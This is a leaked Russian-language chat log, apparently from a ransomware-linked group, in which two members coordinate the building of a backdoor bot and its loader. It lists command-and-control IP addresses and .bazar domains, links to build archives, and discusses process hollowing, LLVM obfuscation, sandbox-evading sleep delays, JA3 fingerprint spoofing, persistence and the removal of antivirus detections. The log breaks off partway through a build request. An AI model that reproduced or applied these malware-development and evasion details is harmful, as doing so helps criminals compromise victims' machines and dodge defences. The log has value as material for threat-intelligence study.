У бота сейчас есть 2 детекта: Win.Packed.Mikey-9787477-0, a variant of Win64/Kryptik.BZB trojan.
[07.09.21 11:14:50] collin:		+
[07.09.21 11:15:10] geraldo:		Импортируется только kernel32, ntdll, kernelbase
[07.09.21 11:16:43] geraldo:		CRT не стал у бота отключать.
LLVM Obfuscator 10 используется и в боте, и в загрузчике
[07.09.21 13:27:41] collin:		скинь мне утилиту "get_id_bk" актуальную для своих сборок
[07.09.21 13:27:47] collin:		есть такая?
[07.09.21 13:28:02] geraldo:		Есть
[07.09.21 13:37:35] geraldo:		```
https://privatlab.com/s/v/VDWoXawEqYSpJj8LDZBr
https://privatlab.com/s/d/VDWoXawEqYSpJj8LDZBr/N0GNX#delete
```
[07.09.21 13:39:57] collin:		+
[10.09.21 13:54:28] collin:		привет!
[10.09.21 13:54:58] collin:		сделай сборку группа 6
[10.09.21 13:55:09] collin:		x86, generic
[10.09.21 13:55:13] collin:		адреса и базары:
[10.09.21 13:55:16] collin:		```
адреса (домены) первого этапа
бот:
194.15.112.71
172.83.155.173
45.42.201.123
194.135.33.179

лоадер:
45.42.201.123
194.135.33.179
194.15.112.71
172.83.155.173

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[10.09.21 13:55:26] collin:		направь wild
[10.09.21 13:56:35] collin:		и напиши ему инфу - в README.txt или отдельно, в какой процесс бот БК может маскироваться (все варианты если по разному может быть)
[10.09.21 14:00:09] geraldo:		Привет! Принял. Только вечером смогу выслать сборку
[10.09.21 14:00:41] collin:		во сколько?
[10.09.21 14:00:55] geraldo:		После 20:00 по МСК
[10.09.21 14:01:10] collin:		сек, сейчас уточню
[10.09.21 14:01:27] collin:		ну после это понятие растяжимое, точнее можно?
[10.09.21 14:01:37] collin:		20:30, 21:00..
[10.09.21 14:01:47] geraldo:		до 21:00
[10.09.21 14:04:12] collin:		отбой тогда, не надо
[13.09.21 14:13:05] collin:		привет!
[13.09.21 14:13:09] collin:		https://privatlab.com/s/v/8RqLxwAz2aul95RJB8qy
[13.09.21 14:13:17] collin:		это новая задача для тебя "Режим БК persistent1", таск в редмайне добавил
[13.09.21 14:13:26] collin:		сдвигай все доработки, приоритет работ такой:
[13.09.21 14:13:36] collin:		1) в первую очередь чистки и исправления критических ошибок при функционировании
2) затем реализация вот этого нового режима
3) после того как сделаешь новый режим - возвращайся к остальным доработкам, с учетом их приоритетов в тасках
[13.09.21 14:13:39] collin:		подтверди получение
[13.09.21 14:58:43] geraldo:		Привет!
Получил задание
[13.09.21 15:00:18] geraldo:		Понял. Задачи по исправлению ошибок сделал и функции для пропуска адресов добавил
[13.09.21 15:00:44] collin:		ага
[13.09.21 15:00:56] collin:		есть 2 адреса засквоттенные
[13.09.21 15:01:09] collin:		```
сквоттинг:
172.16.25.146 ewuqeked.bazar  82.238.231.108
192.168.11.8 ekxeidyw.bazar 62.86.245.246
```
[13.09.21 15:01:14] collin:		проверь на них скип-листы
[13.09.21 15:01:21] geraldo:		Хорошо
[13.09.21 15:03:48] collin:		завтра в 12-13 мск будешь в сети, сборку сможешь сделать?
[13.09.21 15:04:24] geraldo:		Смогу. В каком режиме будет сборка?
[13.09.21 15:04:41] collin:		x64 regsvr32, 2 разные группы
[13.09.21 15:05:04] geraldo:		Хорошо
[13.09.21 16:29:03] collin:		скорее всего x86 regsvr32 завтра сборка нужна будет
[13.09.21 16:29:11] collin:		она у тебя нормально работает?
[13.09.21 16:49:29] geraldo:		Проверю. Должна нормально работать. Только там детекты были
[14.09.21 10:25:22] collin:		привет!
[14.09.21 10:25:32] collin:		сборка нужна будет но позднее, не уходи далеко
[14.09.21 10:25:36] collin:		с адресами заминка
[14.09.21 10:25:49] geraldo:		Привет!
Ясно
[14.09.21 10:49:10] geraldo:		Потестировал 32-разрядного бота сегодня: 
```
c03599fad97666b9ac06239013cc9cf1 
```
[14.09.21 10:50:22] collin:		экзешники не отработали, надо будет отдельную группу под x86 сделать..
[14.09.21 10:50:25] collin:		остальное все норм?
[14.09.21 10:51:02] collin:		вижу скрипты отработали
[14.09.21 10:51:08] collin:		значит норм
[14.09.21 10:51:25] geraldo:		А вот "nop 60"?
[14.09.21 10:51:37] geraldo:		Эта команда ответ ждёт?
[14.09.21 10:52:10] collin:		поменяли логику в админке
[14.09.21 10:52:20] collin:		теперь последний ноп в waiting - когда не разу не получен
[14.09.21 10:52:26] collin:		после первого получения он всегда в pending
[14.09.21 10:52:35] collin:		nop в pending - это считай текущий таймаут
[14.09.21 10:52:52] collin:		если ставишь новую команду ноп - предыдущий закрывается в done
[14.09.21 10:53:04] geraldo:		Понятно
[14.09.21 11:01:17] collin:		сделай сборку группа 20
[14.09.21 11:01:23] collin:		x64, regsvr32
[14.09.21 11:01:25] collin:		адреса и базары:
[14.09.21 11:01:34] collin:		```
адреса (домены) первого этапа
бот:
172.83.155.173
89.41.182.139
194.15.112.159
194.135.33.179

лоадер:
194.135.33.179
194.15.112.159
172.83.155.173
89.41.182.139

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[14.09.21 11:01:38] collin:		направь wild
[14.09.21 11:01:46] geraldo:		Принял
[14.09.21 11:02:06] collin:		все таки x64 нужна, сто раз меняли заказчики..
[17.09.21 09:55:54] collin:		привет!
[17.09.21 09:55:57] collin:		как успехи по доработке нового режима
[17.09.21 09:56:03] collin:		сборка с одним ботом который?
[17.09.21 09:58:10] geraldo:		Привет!
Пункты 1, 3 из ТЗ сделаны.
[17.09.21 09:59:07] geraldo:		Всё вместе ещё не протестировал.
[17.09.21 09:59:25] collin:		ок
[22.09.21 13:22:59] geraldo:		Задержку от 1 до 168 часов перед первым отстуком оставить? Или убрать пока для тестирования?
[22.09.21 13:24:42] collin:		задержка определеяется без привязки к системному времени или с учетом?
[22.09.21 13:24:55] collin:		т.е. если я время переведу - задержку обойду так?
[22.09.21 13:25:11] collin:		запущу бк - потом переведу время
[22.09.21 13:25:38] geraldo:		Не пробовал. Но это обычный Sleep
[22.09.21 13:30:00] collin:		один длинный Sleep, или маленькими отрезками в цикле?
[22.09.21 13:30:14] geraldo:		Один
[22.09.21 13:30:37] collin:		тогда - пока подожди со сборкой, уточню
[22.09.21 13:55:11] geraldo:		Сделал два файла: с задержкой и без
```
https://privatlab.com/s/v/aqRRWNaMrjuAn5NO3QQX
https://privatlab.com/s/d/aqRRWNaMrjuAn5NO3QQX/VErBG#delete
```
[22.09.21 13:56:47] geraldo:		Запускается через starter.exe техникой process hollowing, который в архиве:
starter.exe "C:\path to dll file\bd_pre1_x64_release_nologs_v_1_38.dll"
[22.09.21 14:14:13] collin:		+
[22.09.21 15:32:21] collin:		bd_pre1_x64_release_nologs_v_1_38.dll - с маленькой задержкой?
[22.09.21 15:38:35] geraldo:		Да, от 30 секунд до 3 минут.
[22.09.21 15:39:01] collin:		а логированные модули есть?
[22.09.21 15:39:24] geraldo:		Который с суффиксом _Sleep, тот долго ждёт. Логированные тоже есть
[22.09.21 15:39:39] geraldo:		Сейчас всё вышлю
[22.09.21 15:39:58] geraldo:		Или не нужны пока?
[22.09.21 15:41:03] collin:		пока не надо
[22.09.21 15:41:06] collin:		172.83.155.173 это что за адрес?
[22.09.21 15:41:33] collin:		я дал адреса другие, этот старый
[22.09.21 15:43:05] geraldo:		Сейчас исправлю. Что-то перепутал
[22.09.21 15:44:03] collin:		ладно пока оставь, не делай новую
[22.09.21 15:44:15] collin:		как у тебя вызывается Sleep который для задержек используется?
[22.09.21 15:45:00] geraldo:		```
pSleep((1 + pGetTickCount() % 167) * 60 * 60 * 1000);
```
[22.09.21 15:45:14] collin:		обфускация на основе GetApi.h?
[22.09.21 15:45:19] geraldo:		Да
[22.09.21 15:45:28] collin:		jr
[22.09.21 15:45:53] collin:		есть решение как сократить и проверить при этом задержки на уровне крипта, я пока этот момент буду прорабатывать
[22.09.21 15:46:21] geraldo:		Основа - GetApi, но он изменён.
[22.09.21 15:52:41] collin:		через какое время после выполнения команды/отправки отчета на нее
[22.09.21 15:52:46] collin:		бот забирает очередную команду?
[22.09.21 15:54:10] collin:		чота не бьется по таймингам опять
[22.09.21 15:54:11] collin:		846aaa1bdb95894d78fb565dce04da6f
[22.09.21 15:54:25] collin:		nop 60, команда отработала и бот отправил отчет 4 минуты назад, следующую не забирает
[22.09.21 15:57:48] geraldo:		runexe отработала, следующая должна быть забрана через 5-10 минут
[22.09.21 15:58:04] collin:		почему?
[22.09.21 15:58:16] collin:		nop 60 же,
[22.09.21 16:01:06] collin:		если считаешь между командами задержку как для блокирующего режима - то 1 - 2 минуты
[22.09.21 16:01:18] collin:		если как для idle то 30 секунд - 2 минуты
[22.09.21 16:01:33] collin:		5-10 тут ни при каком раскладе
[22.09.21 16:03:09] geraldo:		Путаюсь с таймингами. Хорошо, сделаю меньше.
[22.09.21 16:06:39] geraldo:		Это из задания "02. Отстук с переменным интервалом"
Я положил timeout=5 минут, поэтому так и получилось
[22.09.21 16:07:40] collin:		```
В блокирующем режиме бота периодичность отстука (запроса команд) к серверу должна быть со случайным интервалом в диапазоне от timeout до 2*timeout
где timeout - значение интервала времени из последней полученной команды NOP, либо значение при старте по умолчанию (5 минут).
```
[22.09.21 16:07:42] collin:		вот такое было?
[22.09.21 16:08:40] collin:		```
сейчас у нас интервал между отстуками точный - например 5 минут
столько сколько сказал сервер в поле timeout
1. в режиме idle (no operation) пускай следующий отстук будет в случайном промежутке от 30 секунд до 2*timeout
2. в режиме ответа на команду следующий отстук в случайном промежутке от timeout до 2*timeout

```
[22.09.21 16:08:41] collin:		или вот это
[22.09.21 16:08:58] collin:		ну да формулировка тут ничоткая поэтому так и выходит..
[22.09.21 16:10:02] collin:		вообщем там формулировка была ничоткая в первом варианте задачи, поэтому так и получилось
[22.09.21 16:10:09] collin:		добавлю новый таск, напишу
[22.09.21 16:10:37] geraldo:		Да, похоже:
```
сейчас у нас интервал между отстуками точный - например 5 минут
столько сколько сказал сервер в поле timeout
1. в режиме idle (no operation) пускай следующий отстук будет в случайном промежутке от 30 секунд до 2*timeout
2. в режиме ответа на команду следующий отстук в случайном промежутке от timeout до 2*timeout
```
[22.09.21 16:10:38] geraldo:		Ясно
[22.09.21 16:10:50] geraldo:		Ясно
[22.09.21 16:11:00] collin:		```
System	Run_EXE	22.09.2021 15:43	done.	runexe hollowing 60 explorer tst1pre1X64_v1.exe 1234 %id% 5678 %group%
```
[22.09.21 16:11:03] collin:		отчет:
[22.09.21 16:11:13] collin:		```
PID:	7672
Exitcode:	0
Standart_output:	This is stdout test output data 1234567890!@#$%^&*()
Standart_error:	This is stderr test output data !@#$%^&*()1234567890pre1v1
```
[22.09.21 16:11:23] collin:		походу не отработали параметры командой строки, отчет другой был бы иначе
[22.09.21 16:12:32] geraldo:		Да, там ноль-символ попадает в этом exe-файле в поток, поэтому он обрывается
[22.09.21 16:13:18] collin:		в выходных данных?
[22.09.21 16:13:28] geraldo:		Это у меня в боте. Не придумал ещё, как это исправить. Удалить может быть просто его.
[22.09.21 16:13:29] collin:		но раньше работало же
[22.09.21 16:13:50] geraldo:		Не, раньше также было.
[22.09.21 16:13:52] collin:		при получении от дочернего процесса обрывается или при отправке на сервер?
[22.09.21 16:14:12] collin:		экранировать как-нибудь
[22.09.21 16:14:31] geraldo:		При отправке на сервер. Аргументы считываются, это проверено
[22.09.21 16:15:01] geraldo:		Иначе бы rundll вообще бы не работала
[22.09.21 16:15:14] collin:		через процентное кодирование экранируй его
[22.09.21 16:15:42] collin:		все-таки на старой прото2 админке такого не было мне кажется, что-то веб-кодеры не доделали тут
[22.09.21 16:16:38] geraldo:		Нет. Это у меня проблема. Когда поток копируется в строку. Эту же строку я конкатенирую, а там 0-символ.
[22.09.21 16:17:00] geraldo:		Поэтому поток не весь копируется. Это мне нужно исправить
[22.09.21 16:18:34] geraldo:		Там посмотри ещё команду "runexe hollowing 60 notepad pscp_x64.exe ".
Почему-то сервер в куках не прячет команду.
[22.09.21 16:19:01] collin:		да я заметил, прогоню на другом боте завтра
[22.09.21 16:19:07] collin:		тоже что-то с админкой, такое подозрение
[22.09.21 16:19:10] geraldo:		Я вчера 3 раза пробовал её выполнить, всё одно и тоже
[22.09.21 16:19:35] geraldo:		Причём отдельно выполняется, если задать её вручную
[22.09.21 16:20:39] geraldo:		Приходит вот такой ответ:
```
HTTP/1.1 200 OK
Server: nginx/1.14.2
Content-Type: text/html; charset=UTF-8
Connection: close
Date: Tue, 21 Sep 2021 18:47:49 GMT
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block



```
[22.09.21 16:20:39] collin:		попробуй объединять как бинарные массивы, а не строки
[22.09.21 16:21:13] geraldo:		Хорошо
[23.09.21 13:55:53] collin:		привет!
[23.09.21 13:56:13] collin:		насчет выходного потока с нулевым символом - действительно что-то в админке поменялось, т.к. у меня тоже так обрезалось
[23.09.21 13:56:36] collin:		ээкранировал 0 через %00 - отработало норм
[23.09.21 13:56:43] collin:		так что делай также
[23.09.21 17:08:22] collin:		добавил задачу 644 - уточнение по переменному отстуку
[23.09.21 17:08:26] collin:		сделай в первую очередь
[23.09.21 17:30:51] geraldo:		Привет! Хорошо
[24.09.21 11:54:12] collin:		привет!
[24.09.21 11:54:21] collin:		у тебя режим generic-glue реализован?
[24.09.21 12:05:49] geraldo:		Привет! Не протестировал его ещё. Основной функционал (копирование, перезапуск) реализован.
[24.09.21 12:06:08] collin:		ок
[28.09.21 12:03:33] collin:		привет!
[28.09.21 12:03:40] collin:		сделай сборку группа g4
[28.09.21 12:03:51] collin:		x64, rundll32(StartW)
[28.09.21 12:04:02] collin:		адреса и базары:
[28.09.21 12:04:04] collin:		```
адреса (домены) первого этапа
бот:
161.35.29.127
161.35.27.53
161.35.19.83
161.35.17.114

лоадер:
161.35.19.83
161.35.17.114
161.35.29.127
161.35.27.53

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[28.09.21 12:04:07] collin:		направь nick
[28.09.21 12:04:43] geraldo:		Привет!
Принял
[29.09.21 13:18:34] collin:		привет!
[29.09.21 13:18:45] collin:		1) сделай одну доработку в первую очередь - таск 652
[29.09.21 13:18:49] geraldo:		Привет!
[29.09.21 13:18:56] collin:		2) ты можешь хотябы с 13 мск быть на связи?
[29.09.21 13:19:12] collin:		у нас сейчас аврал ближайший месяц, один кодер в отпуске, потом второй пойдет
[29.09.21 13:22:35] geraldo:		Постараюсь. Задачу увидел
[30.09.21 08:47:03] collin:		привет!
[30.09.21 08:47:13] collin:		сделай сборку группа g4
[30.09.21 08:47:33] collin:		x64, rundll32(StartW)
[30.09.21 08:47:37] collin:		адреса и базары:
[30.09.21 08:47:47] collin:		```
адреса (домены) первого этапа
бот:
5.183.78.108
213.59.119.200
195.133.192.89
5.181.80.115

лоадер:
195.133.192.89
5.183.78.108
5.181.80.115
213.59.119.200

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[30.09.21 08:47:52] collin:		выдавай nick
[30.09.21 08:48:02] geraldo:		Привет!
Принял
[30.09.21 10:49:27] collin:		сделай еще две сборкиЕ
[30.09.21 10:49:42] collin:		1) группа g9, x64, generic
[30.09.21 10:49:54] collin:		2) группа g10, x64, rundll32(ElementID)
[30.09.21 10:49:57] collin:		адреса и базары:
[30.09.21 10:50:06] collin:		```
адреса (домены) первого этапа
бот:
138.68.74.234
161.35.25.202
164.90.226.28
164.90.226.30

лоадер:
164.90.226.28
164.90.226.30
138.68.74.234
161.35.25.202

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[30.09.21 10:50:11] collin:		выдавай porfirio
[30.09.21 10:50:24] geraldo:		Принято
[24.10.21 13:44:44] geraldo:		Привет!
[24.10.21 13:46:25] geraldo:		Принял
[24.10.21 14:09:26] geraldo:		Хорошо
[24.10.21 14:32:47] geraldo:		Готово
```
https://file.io/gmOZmzxvnBWx
```
[24.10.21 14:33:36] geraldo:		В этом же архиве ключи для спец-сборки. Удалось их восстановить.
[24.10.21 14:34:13] geraldo:		И загрузчик для спец-сборки (группа 20) заново пересобрал с этими ключами
[24.10.21 14:35:42] geraldo:		Загрузчик с этими "странными" адресами работает нормально. Он загружает нагрузку и запускает её.
[24.10.21 14:36:38] geraldo:		Да
[24.10.21 14:37:28] geraldo:		Да. Но всё равно с ними работает только загрузчик.
Бот с ними работать не желает. Команды /id/2 работают, остальные - /id/3 и /id/4.
[24.10.21 14:37:36] geraldo:		не работают
[24.10.21 14:38:24] geraldo:		Команды /id/3 и /id/4 с ними не работают. Выходит ошибка 404.
[24.10.21 14:38:55] geraldo:		Да
[24.10.21 14:40:33] geraldo:		Так точно
[24.10.21 14:42:05] geraldo:		Тут ещё Bitdefender сообщает, что галактеко в опасносте:
[24.10.21 14:45:49] geraldo:		```
Обнаружен зараженный веб-ресурс
Часов назад - 17

Компонент:
Предотвращение сетевых угроз

Мы заблокировали эту опасную страницу в целях безопасности: 
https://www.calacatta.com/
Доступ через: lsass.exe
Опасные страницы пытаются установить программное обеспечение, которое может нанести вред устройству, собирать личную информацию или действовать без вашего ведома
```
[24.10.21 14:47:34] geraldo:		Нет, процесс не прерывает, только интернет-соединение блокирует
[24.10.21 14:48:07] geraldo:		В цикле это окошко выскакивает, пока бот по адресам проходит
[25.10.21 11:43:35] geraldo:		Привет. Принял.
[25.10.21 12:03:55] geraldo:		Хорошо
[25.10.21 15:55:49] geraldo:		Хорошо.
[26.10.21 10:14:10] geraldo:		Привет! Принял
[26.10.21 10:34:23] geraldo:		Хорошо
[26.10.21 11:05:02] geraldo:		Понятно
[28.10.21 09:15:54] geraldo:		Привет!
Какие нужны группы?
[28.10.21 09:31:28] geraldo:		Три последние версии только сохранились
```
https://privatlab.com/s/v/nRbY2rbWXqSrAo2BpXnJ
https://privatlab.com/s/d/nRbY2rbWXqSrAo2BpXnJ/EGdjY#delete
```
[28.10.21 09:35:48] geraldo:		К сожалению, нет.(( Я эти-то начал сохранять только после того, как пришлось восстанавливать елючи от спец-сборки
[28.10.21 16:42:43] geraldo:		Принял
[28.10.21 16:59:52] geraldo:		Имеется ввиду что может быть запущено несколько новых экземпляров БК?
[28.10.21 17:02:36] geraldo:		А идентификаторы пересекаться могут?
[28.10.21 17:05:20] geraldo:		Понятно
[29.10.21 07:45:17] geraldo:		Привет!
[29.10.21 07:51:56] geraldo:		Хорошо, так и думал. Если его не завершать, он же бесконечно будет запускаться по заданию BITS
[29.10.21 07:54:51] geraldo:		Да могу понемногу начинать
[29.10.21 08:52:07] geraldo:		Принял
[29.10.21 08:53:38] geraldo:		Режим geberic?
[29.10.21 09:33:17] geraldo:		```
https://privatlab.com/s/v/bYV2NEaRbyI3wjqMEqer
https://privatlab.com/s/d/bYV2NEaRbyI3wjqMEqer/V73AW#delete
```
[29.10.21 11:00:26] geraldo:		Это уже давно делал. Да, файл удаляется после завершения работы
[29.10.21 11:50:29] geraldo:		Принял
[29.10.21 11:52:29] geraldo:		Можно ещё загрузить файл командой "drop file" и запустить его командой "run bat"
[29.10.21 14:44:52] geraldo:		Разбираюсь. Сложности небольшие возникли. Попозже сегодня вышлю
[29.10.21 16:32:53] geraldo:		Хорошо. Переписать кое-что придётся
[29.10.21 16:39:03] geraldo:		Увидел
[01.11.21 10:01:39] geraldo:		Привет!
Принял
[01.11.21 11:06:17] geraldo:		Готово!
```
https://privatlab.com/s/v/M9xOknNkgDcB7V3mp35J
https://privatlab.com/s/d/M9xOknNkgDcB7V3mp35J/r4agj#delete
```
[01.11.21 11:17:15] geraldo:		Загрузчик копирует себя и перезапускает при первом запуске
[01.11.21 13:15:22] geraldo:		В папку %AppData%\Roaming\OneDrive
[01.11.21 14:28:59] geraldo:		Да
[02.11.21 10:14:16] geraldo:		Привет!
Принято
[02.11.21 11:12:12] geraldo:		Команда rundll32 какая-то не такая поступает из админки.
[02.11.21 11:12:40] geraldo:		Почему-то аргумент начинается с имени файла.
[02.11.21 11:12:52] geraldo:		Это так и должно быть?
[02.11.21 11:13:20] geraldo:		%cmdline% имею ввиду
[02.11.21 11:15:33] geraldo:		```
1f71945a30e70002b41d6b2332276dae
```
[02.11.21 11:17:15] geraldo:		В rundll32 точно
[02.11.21 11:17:35] geraldo:		В regsvr32 тоже не работает так как надо.
[02.11.21 11:17:58] geraldo:		Раньше всё работало
[02.11.21 11:46:34] geraldo:		Это только в следующих сборках смогу учесть. Предыдущие сборки могут работать только числовым параметром "%pid%"
[02.11.21 11:47:22] geraldo:		Иначе выскакивает окно с сообщением, что точка входа не найдена
[02.11.21 12:12:40] geraldo:		Принял
[02.11.21 12:14:38] geraldo:		В карточку группы 19r никак не получается загрузить бота.
[02.11.21 12:15:06] geraldo:		Несколько попыток сделал с разными префиксами. Всё падает
[02.11.21 12:15:51] geraldo:		Админка, наверное.
Пишет
```
Unknown Property – yii\base\UnknownPropertyException
Getting unknown property: common\models\Groups::delmode
```
[02.11.21 12:16:42] geraldo:		С группой 25 всё нормально
[02.11.21 12:16:55] geraldo:		Может прав каких-то не хватает?
[02.11.21 12:33:34] geraldo:		Старый формат команды 11 "rundll" полностью упраздняется?
[02.11.21 12:34:22] geraldo:		Хорошо
[02.11.21 13:33:33] geraldo:		Подправил команду rundll, перезалил файл бота
[02.11.21 13:34:22] geraldo:		Да, чтобы там могла быть строка
[02.11.21 13:49:42] geraldo:		Всё работает
[03.11.21 08:49:27] geraldo:		Привет!
Принял
[03.11.21 13:37:01] geraldo:		Задержки перед отстуком убрать?
[03.11.21 13:38:07] geraldo:		Ясно
[03.11.21 13:39:53] geraldo:		Забыл просто. В каких-то сборках убирали же недавно задержки.
[03.11.21 16:17:46] geraldo:		Понятно
[04.11.21 12:20:51] geraldo:		Привет!
Принято
[04.11.21 12:57:08] geraldo:		Принял
[04.11.21 16:38:36] geraldo:		Да нет вроде бы
[04.11.21 16:43:25] geraldo:		Логи пусть покажет
[09.11.21 12:48:33] geraldo:		Привет! Принял
[09.11.21 13:44:40] geraldo:		Принял
[09.11.21 14:53:03] geraldo:		Использую в сборках LLVM Obfuscator 10 тот же, что ты давал когда-то.
[09.11.21 14:54:17] geraldo:		Есть собранный 64-разрядный clang-cl.exe 12 версию. Долго не мог его собрать.
[09.11.21 14:56:01] geraldo:		С третьей попытки только получилось его собрать. пришлось разбираться в исходниках LLVM, потому что тот патч что был, он для версии 10
[09.11.21 14:58:46] geraldo:		Нет, но, наверное, попробую как-нибудь собрать его.
[10.11.21 15:31:26] geraldo:		Привет! Принял
[10.11.21 16:19:36] geraldo:		Готово!
```
https://privatlab.com/s/v/pw65DjLewoi9EJRgGXMe
https://privatlab.com/s/d/pw65DjLewoi9EJRgGXMe/kDnBE#delete
```
[12.11.21 10:08:01] geraldo:		Привет!
Получил архив
[12.11.21 15:04:59] geraldo:		Принял
[12.11.21 15:07:19] geraldo:		Вот так понятно)
[12.11.21 16:01:50] geraldo:		Сборки отправил
[15.11.21 08:14:26] geraldo:		Привет!
Принял
[15.11.21 08:44:20] geraldo:		Адреса точно рабочие?
[15.11.21 08:55:10] geraldo:		У меня не пингуется ни один
[15.11.21 08:58:19] geraldo:		А если VPN выключить, то пингуется. Это что значит?
[15.11.21 09:01:33] geraldo:		Через VPN вот этот:
```
199.189.108.71
```
[15.11.21 09:04:39] geraldo:		Оказывается с включенным VPN вообще интернет не работает
[15.11.21 09:05:06] geraldo:		Ночью ещё всё работало
[15.11.21 09:05:15] geraldo:		Наш
[17.11.21 11:56:11] geraldo:		Привет!
Принял
[18.11.21 11:05:26] geraldo:		Привет!
[18.11.21 11:06:28] geraldo:		Принял
[18.11.21 11:55:12] geraldo:		Готово!
```
https://privatlab.com/s/v/ZV22ZykNJLIxnByV2elB
https://privatlab.com/s/d/ZV22ZykNJLIxnByV2elB/a9eNx#delete
```
[22.11.21 10:29:27] geraldo:		Привет!
Проверил, потестировал загрузчик в режиме generic glue. Первый раз выход происходит через команду return.
[22.11.21 10:32:12] geraldo:		Да, в той что отсылал на прошлой неделе.
[22.11.21 10:33:38] geraldo:		Возможно, что структура стека нарушается. У меня заголовок функции такой:
```
BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
```
[22.11.21 10:35:07] geraldo:		А он вообще отрабатывает?
[22.11.21 10:35:16] geraldo:		Бот не запускается?
[22.11.21 10:43:08] geraldo:		Принял
[22.11.21 11:25:27] geraldo:		Доступ к группе 26 открой, пожалуйста
[22.11.21 11:29:40] geraldo:		Что-то всё равно нет в списке группы 26
[22.11.21 11:30:25] geraldo:		Появилась
[22.11.21 13:34:08] geraldo:		Первую проверил, вторую ещё проверяю
[22.11.21 13:34:44] geraldo:		отстук
[22.11.21 13:57:49] geraldo:		Сборка в режиме persistent1:
```
https://privatlab.com/s/v/DBOezB7OlDhWxAEk9RxD
https://privatlab.com/s/d/DBOezB7OlDhWxAEk9RxD/BoBRj#delete
```
[22.11.21 14:18:00] geraldo:		Логирование работает, но оно не доделано. Я его взялся переписать, но в боте не дописал ещё.
[22.11.21 14:19:26] geraldo:		Передалаю сейчас
[22.11.21 14:31:30] geraldo:		Размер побольше можно сделать или так оставить?
[22.11.21 14:36:02] geraldo:		```
https://privatlab.com/s/v/VDQaopd9xXTW5Zl9JV5n
https://privatlab.com/s/d/VDQaopd9xXTW5Zl9JV5n/Mp7Yo#delete
```
[22.11.21 14:36:13] geraldo:		Добавил dll-файл
[22.11.21 15:27:11] geraldo:		Хорошо
[24.11.21 12:36:36] geraldo:		Привет!
Отпечаток ja3 нужно изменять только в загрузчике? В боте не нужно?
[24.11.21 12:37:44] geraldo:		Функция SendHttpsRequest, которая вызывает функции из winhttp, тестовая? В боевом режиме же вызывать её не нужно?
[24.11.21 12:38:19] collin:		Привет!
[24.11.21 12:38:47] collin:		схема шифров меняется централизованно на всю систему, поэтому один раз меняем только в лоадере
[24.11.21 12:40:16] collin:		SendHttpsRequest - это отправка тестового запроса, чтобы посмотреть сниффером потом что и как отправляется
[24.11.21 12:40:23] collin:		функционал по смене нужен из ChangeJA3();
[24.11.21 12:41:25] geraldo:		Так и думал. Спасибо
[26.11.21 15:25:29] collin:		Привет!
[26.11.21 15:25:35] collin:		Нужно почистить бота от статики на АВ
[26.11.21 15:25:42] collin:		таск добавил
[26.11.21 15:25:50] collin:		сделай это в первую очередь, перед остальными задачами по доработке
[26.11.21 15:25:52] collin:		пока разово
[26.11.21 15:28:25] geraldo:		Привет! Принял
[29.11.21 09:15:02] collin:		Привет!
[29.11.21 09:15:08] collin:		сделай сборку для новой основной админки
[29.11.21 09:15:15] collin:		группа g11, x64, generic
[29.11.21 09:15:26] collin:		```
адреса (домены) первого этапа
бот:
162.33.177.196
162.33.178.35
162.33.179.103
162.33.179.88

лоадер:
162.33.179.103
162.33.179.88
162.33.177.196
162.33.178.35

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[29.11.21 09:15:31] collin:		направь nick
[29.11.21 10:21:06] geraldo:		Привет!
Принял
[30.11.21 09:21:29] collin:		привет!
[30.11.21 09:22:21] collin:		сделай новую сборку для группы tst4 x64 generic-glue
[30.11.21 09:22:43] collin:		```
адреса (домены) первого этапа
бот:
162.33.177.196
162.33.178.35
162.33.179.103
162.33.179.88

лоадер:
162.33.179.103
162.33.179.88
162.33.177.196
162.33.178.35

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[30.11.21 09:22:52] collin:		направь мне
[30.11.21 09:24:02] geraldo:		Привет!
Аргумент какой (/probe_no_soft)?
[30.11.21 09:24:48] collin:		`/test20211130`
[30.11.21 09:50:49] geraldo:		Готово!
```
https://privatlab.com/s/v/3QWoLxel4Zsj07Z8BJ9O
https://privatlab.com/s/d/3QWoLxel4Zsj07Z8BJ9O/WzBxz#delete
```
[03.12.21 11:25:06] collin:		Привет!
[03.12.21 11:25:23] collin:		сделай сборку для группы tst4
[03.12.21 11:25:28] collin:		x64, generic-glue
[03.12.21 11:25:41] collin:		адреса (домены) первого этапа
бот:
162.33.179.52
162.33.177.154
45.61.136.145
162.33.178.115

лоадер:
45.61.136.145
162.33.178.115
162.33.179.52
162.33.177.154

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
[03.12.21 11:25:54] collin:		направь мне и odis
[03.12.21 11:26:39] collin:		ключ params_no_soft: `/tst20211203`
[03.12.21 11:30:29] geraldo:		Привет!
Принял
[03.12.21 12:24:46] geraldo:		Готово!
```
https://privatlab.com/s/v/YOG99gWoZLS4BlYM6xz0
https://privatlab.com/s/d/YOG99gWoZLS4BlYM6xz0/y6jnV#delete
```
[03.12.21 12:26:30] collin:		+
[06.12.21 10:57:37] collin:		Привет!
[06.12.21 10:57:41] collin:		сделай сборку группа g4
[06.12.21 10:57:47] collin:		x64, regsvr32
[06.12.21 10:57:56] collin:		```
адреса (домены) первого этапа
бот:
162.33.179.36
162.33.178.30
162.33.178.204
162.33.177.164

лоадер:
162.33.178.204
162.33.177.164
162.33.179.36
162.33.178.30

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[06.12.21 10:58:00] collin:		направь wild
[06.12.21 11:40:35] geraldo:		Привет!
Принял
[07.12.21 12:08:13] collin:		Привет!
[07.12.21 12:08:15] collin:		сделай сборки:
[07.12.21 12:08:37] collin:		1) группа g15 - x64, rundll32(SendTask)
[07.12.21 12:08:52] collin:		2) группа 25 - x64, rundll32(AddNewData)
[07.12.21 12:09:04] collin:		```
